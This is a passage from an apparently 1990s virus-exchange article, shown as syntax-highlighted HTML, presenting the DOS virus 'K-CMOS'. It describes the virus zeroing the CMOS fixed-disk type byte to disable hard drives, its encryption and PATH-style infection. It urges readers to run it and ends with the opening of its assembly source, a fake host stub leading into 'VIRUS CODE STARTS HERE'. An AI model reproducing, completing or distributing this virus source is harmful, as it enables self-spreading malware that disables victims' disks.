         </span><span class="sc9">For</span><span class="sc0"> </span><span class="sc5">example</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Input</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hardrive</span><span class="sc0"> </span><span class="sc9">type</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">subtract</span><span class="sc0"> </span><span class="sc5">some</span><span class="sc0"> </span><span class="sc10">small</span><span class="sc0">
         </span><span class="sc5">digit</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">output</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CMOS.</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">checksum</span><span class="sc0">
         </span><span class="sc5">must</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">fixed</span><span class="sc0">!</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">horrible</span><span class="sc0"> </span><span class="sc5">mess</span><span class="sc0"> </span><span class="sc5">results</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">subsequent</span><span class="sc0">
         </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">up.</span><span class="sc0">

         </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Changed</span><span class="sc0"> </span><span class="sc5">dates</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">times</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">etc.</span><span class="sc0">
         </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">uninformed</span><span class="sc0"> </span><span class="sc5">could</span><span class="sc0"> </span><span class="sc5">thing</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Nicad</span><span class="sc0"> </span><span class="sc5">battery</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">died</span><span class="sc4">,</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">his</span><span class="sc4">/</span><span class="sc5">her</span><span class="sc0"> </span><span class="sc5">computer</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">possessed</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">evil</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Nigerian</span><span class="sc0">
         </span><span class="sc5">Deities.</span><span class="sc0">

         </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Changed</span><span class="sc0"> </span><span class="sc5">BIOS</span><span class="sc0"> </span><span class="sc5">passwords</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">inability</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">access</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">computer.</span><span class="sc0">
         </span><span class="sc5">On</span><span class="sc0"> </span><span class="sc5">newer</span><span class="sc0"> </span><span class="sc5">AMI</span><span class="sc0"> </span><span class="sc5">BIOSes</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">set</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">change</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">password</span><span class="sc0">
         </span><span class="sc5">required</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">access</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">computer.</span><span class="sc0">  </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">topic</span><span class="sc0"> </span><span class="sc5">was</span><span class="sc0"> </span><span class="sc5">discussed</span><span class="sc0">
         </span><span class="sc5">briefly</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">recent</span><span class="sc0"> </span><span class="sc5">issue</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0"> </span><span class="sc5">News</span><span class="sc0"> </span><span class="sc5">International</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> 
         </span><span class="sc5">upshot</span><span class="sc0"> </span><span class="sc5">being</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">unsuspecting</span><span class="sc0"> </span><span class="sc5">could</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">flummoxed</span><span class="sc0"> </span><span class="sc6">into</span><span class="sc0">
         </span><span class="sc5">throwing</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">computer</span><span class="sc0"> </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">window</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">more</span><span class="sc0"> </span><span class="sc5">realistically</span><span class="sc4">,</span><span class="sc0">
         </span><span class="sc5">calling</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">technician.</span><span class="sc0"> </span><span class="sc6">In</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc5">where</span><span class="sc0"> </span><span class="sc5">some</span><span class="sc0"> </span><span class="sc5">knowledge</span><span class="sc0"> </span><span class="sc5">about</span><span class="sc0"> 
         </span><span class="sc5">computers</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">present</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">opened</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">jumper</span><span class="sc0">
         </span><span class="sc5">found</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CMOS.</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">No</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">don</span><span class="sc13">'t have to disconnect 
</span><span class="sc0">         </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">battery.</span><span class="sc0">  </span><span class="sc6">And</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">didn</span><span class="sc13">'t throw out your machine manuals
</span><span class="sc0">         </span><span class="sc5">did</span><span class="sc0"> </span><span class="sc5">you?</span><span class="sc4">)</span><span class="sc0">

             </span><span class="sc5">Although</span><span class="sc0"> </span><span class="sc5">many</span><span class="sc0"> </span><span class="sc5">anti</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">programs</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">save</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">restore</span><span class="sc0">
         </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">values</span><span class="sc0"> </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">part</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">their</span><span class="sc0"> </span><span class="sc5">function</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">currently</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0"> 
         </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc0"> </span><span class="sc5">one</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc0"> </span><span class="sc5">resident</span><span class="sc0"> </span><span class="sc5">program</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">checks</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">changes</span><span class="sc0"> 
         </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Thunderbyte</span><span class="sc13">'s TBMEM.
</span><span class="sc0">
             </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">month</span><span class="sc13">'s example, K-CM”S, falls in category #2: it
</span><span class="sc0">         </span><span class="sc5">kills</span><span class="sc0"> </span><span class="sc10">all</span><span class="sc0"> </span><span class="sc5">fixed</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">drives</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">zeroing</span><span class="sc0"> </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc5">location</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0">
         </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">RAM.</span><span class="sc0"> </span><span class="sc5">It</span><span class="sc0"> </span><span class="sc5">also</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">some</span><span class="sc0"> </span><span class="sc5">encryption</span><span class="sc0"> </span><span class="sc5">abilities</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">a</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">constant</span><span class="sc0"> </span><span class="sc5">decryptor</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">PATH</span><span class="sc0"> </span><span class="sc5">style</span><span class="sc0"> </span><span class="sc5">infection</span><span class="sc0"> </span><span class="sc5">routine</span><span class="sc0">
         </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">actually</span><span class="sc0"> </span><span class="sc5">works</span><span class="sc0">!
         
         </span><span class="sc5">Needless</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">say</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">careful</span><span class="sc0"> </span><span class="sc5">handling</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">necessary</span><span class="sc0"> </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0">
         </span><span class="sc5">spread</span><span class="sc0"> </span><span class="sc5">quite</span><span class="sc0"> </span><span class="sc5">rapidly.</span><span class="sc0">

         </span><span class="sc5">Important</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Since</span><span class="sc0"> </span><span class="sc5">K</span><span class="sc4">-</span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">zero</span><span class="sc13">'s the CMOS value for the fixed
</span><span class="sc0">         </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">execution</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">unless</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">restore</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">value</span><span class="sc0"> </span><span class="sc5">before</span><span class="sc0"> </span><span class="sc5">ending</span><span class="sc0">
         </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">experiment</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">some</span><span class="sc0"> </span><span class="sc5">software</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">reloading</span><span class="sc0"> </span><span class="sc5">tool</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0">
         </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">dead</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc0"> </span><span class="sc5">when</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">finally</span><span class="sc0"> </span><span class="sc5">get</span><span class="sc0"> </span><span class="sc5">around</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0">
         </span><span class="sc5">rebooting.</span><span class="sc0">  </span><span class="sc5">Keep</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">mind</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">don</span><span class="sc13">'t know how to reset
</span><span class="sc0">         </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">power</span><span class="sc0"> </span><span class="sc5">up</span><span class="sc0"> </span><span class="sc5">using</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">built</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">BIOS</span><span class="sc0"> </span><span class="sc5">setup</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0">
         </span><span class="sc5">sit</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">dumb</span><span class="sc0"> </span><span class="sc5">stew</span><span class="sc0"> </span><span class="sc5">wondering</span><span class="sc0"> </span><span class="sc5">why</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">ran</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">which</span><span class="sc0">
         </span><span class="sc5">unhooked</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">drive.</span><span class="sc0">

         </span><span class="sc5">To</span><span class="sc0"> </span><span class="sc5">prevent</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">happening</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">must</span><span class="sc0"> </span><span class="sc5">familiarize</span><span class="sc0"> </span><span class="sc5">yourself</span><span class="sc0">
         </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">BIOS</span><span class="sc0"> </span><span class="sc5">setup</span><span class="sc0"> </span><span class="sc5">program.</span><span class="sc0"> </span><span class="sc5">Here</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">brief</span><span class="sc0"> </span><span class="sc5">walkthrough</span><span class="sc0"> </span><span class="sc5">which</span><span class="sc0">
         </span><span class="sc5">could</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">used</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">properly</span><span class="sc0"> </span><span class="sc5">restore</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">machine</span><span class="sc0"> </span><span class="sc5">after</span><span class="sc0"> </span><span class="sc5">K</span><span class="sc4">-</span><span class="sc5">CMOS</span><span class="sc0">
         </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">altered</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">CMOS</span><span class="sc4">:</span><span class="sc0">
         
         </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">BEFORE</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">execute</span><span class="sc0"> </span><span class="sc5">K</span><span class="sc4">-</span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">power</span><span class="sc0"> </span><span class="sc5">up</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bring</span><span class="sc0"> </span><span class="sc5">up</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> 
         </span><span class="sc5">BIOS</span><span class="sc0"> </span><span class="sc5">setup</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">holding</span><span class="sc0"> </span><span class="sc5">down</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">DEL</span><span class="sc0"> </span><span class="sc5">key</span><span class="sc0"> </span><span class="sc9">while</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">booting</span><span class="sc0"> 
         </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">computer.</span><span class="sc0"> 
         
         </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">probably</span><span class="sc0"> </span><span class="sc5">see</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">screen</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">number</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">selections.</span><span class="sc0">
         </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">want</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">bring</span><span class="sc0"> </span><span class="sc5">up</span><span class="sc0"> </span><span class="sc3">"Change Basic CMOS Settings"</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0">
         </span><span class="sc5">equivalent.</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0"> </span><span class="sc5">down</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">values</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">HD</span><span class="sc0"> </span><span class="sc5">types</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">drives</span><span class="sc0"> 
         </span><span class="sc10">C</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">D.</span><span class="sc0">

         </span><span class="sc2">3</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc0"> </span><span class="sc5">types</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc3">"47"</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">MUST</span><span class="sc0"> </span><span class="sc9">record</span><span class="sc0"> </span><span class="sc10">all</span><span class="sc0"> 
         </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">displayed</span><span class="sc0"> </span><span class="sc5">fields</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">i.e</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">information</span><span class="sc0"> 
         </span><span class="sc5">such</span><span class="sc0"> </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">number</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">heads</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sectors</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">etc.</span><span class="sc0"> </span><span class="sc5">Again</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">MUST</span><span class="sc0"> 
         </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">BEFORE</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">run</span><span class="sc0"> </span><span class="sc5">K</span><span class="sc4">-</span><span class="sc5">CMOS</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">look</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> 
         </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">manuals</span><span class="sc0"> </span><span class="sc5">somewhere</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">get</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">specific</span><span class="sc0"> </span><span class="sc5">HD</span><span class="sc0"> </span><span class="sc5">information</span><span class="sc0">!

         </span><span class="sc5">NOTE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Newer</span><span class="sc0"> </span><span class="sc5">AMI</span><span class="sc0"> </span><span class="sc5">BIOSes</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0"> </span><span class="sc5">auto</span><span class="sc4">-</span><span class="sc5">detect</span><span class="sc0"> </span><span class="sc5">feature</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> 
         </span><span class="sc5">Setup</span><span class="sc0"> </span><span class="sc5">menu</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">so</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">might</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">worry</span><span class="sc0"> </span><span class="sc5">about</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc9">type</span><span class="sc0"> 
         </span><span class="sc5">number</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">number</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">sectors</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">number</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">heads</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">etc.</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> 
         </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">feature</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">computer</span><span class="sc13">'s BIOS. The setup will do the 
</span><span class="sc0">         </span><span class="sc5">work</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">you.</span><span class="sc0">

         </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Now</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc13">'ve recorded this data, you can test K-CMOS
</span><span class="sc0">         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">watch</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">unhook</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">system.</span><span class="sc0">  </span><span class="sc5">On</span><span class="sc0"> </span><span class="sc5">reboot</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">lose</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
         </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk.</span><span class="sc0">  </span><span class="sc5">Reboot</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bring</span><span class="sc0"> </span><span class="sc5">up</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">Setup</span><span class="sc0"> </span><span class="sc5">program</span><span class="sc0"> </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">above</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">re</span><span class="sc4">-</span><span class="sc0">
         </span><span class="sc6">enter</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">values</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">which</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">previously</span><span class="sc0"> 
         </span><span class="sc5">recorded</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">save.</span><span class="sc0">  </span><span class="sc5">You</span><span class="sc0"> </span><span class="sc5">are</span><span class="sc0"> </span><span class="sc5">back</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">business.</span><span class="sc0">

         </span><span class="sc5">Enjoy</span><span class="sc0">!

</span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span class="sc0">
</span><span class="sc1">;                                K-CM”S.ASM</span><span class="sc0">
</span><span class="sc1">;                            AUTHOR:  K”hntark</span><span class="sc0">
</span><span class="sc1">;                           DATE:    November 93</span><span class="sc0">
</span><span class="sc1">;                           Size: &lt;  1100 bytes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span class="sc0">

</span><span class="sc5">MAIN</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">main</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">main</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">      </span><span class="sc1">;all part in one segment=com file</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc1">;**********************************</span><span class="sc0">
</span><span class="sc1">;  fake host program</span><span class="sc0">
</span><span class="sc1">;**********************************</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">          </span><span class="sc1">;jmp    NEAR PTR VIRUS</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21H</span><span class="sc0">                 </span><span class="sc1">;terminate normally with dos</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc1">;**********************************</span><span class="sc0">
</span><span class="sc1">; VIRUS CODE STARTS HERE</span><span class="sc0">
